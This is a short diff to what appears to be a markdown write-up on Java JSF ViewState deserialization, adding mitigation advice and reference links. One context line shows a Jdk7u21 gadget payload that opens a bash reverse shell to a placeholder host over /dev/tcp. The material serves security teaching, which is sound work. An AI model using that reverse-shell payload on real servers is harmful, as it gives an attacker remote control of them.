@@ -239,3 +239,14 @@ Jdk7u21 "/bin/bash -c /bin/bash${IFS}-i>&/dev/tcp/ipaddress/1337<&1"
 <p align="center">
   <img src="https://media.giphy.com/media/l0D76LT6o1jaG2g0M/source.gif">
 </p>
+
+**Mitigation :**
+* Always validate the scope of Java objects. It is not recommended to use the scope @ViewScoped, because it is often the source of information leaks.
+* Use the keyword transient on attributes you do not want to store in the ViewState. It will prevent their serialization.
+* Always encrypt the ViewState and use an integrity check mechanism if the implementation supports it.
+* Never trust the data contained in a ViewState. Consider they have been potentially tampered by a user. So, you must check them carefully to prevent the attacks previously described.
+
+**Reference :**
+<p><a href="https://www.exploit-db.com/docs/48126">Java Deserialization in ViewState</a>     <br />
+<p><a href="https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html">Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities</a>     <br />
+<p><a href="https://www.synacktiv.com/ressources/JSF_ViewState_InYourFace.pdf">JSF ViewState upside-down</a>     <br />
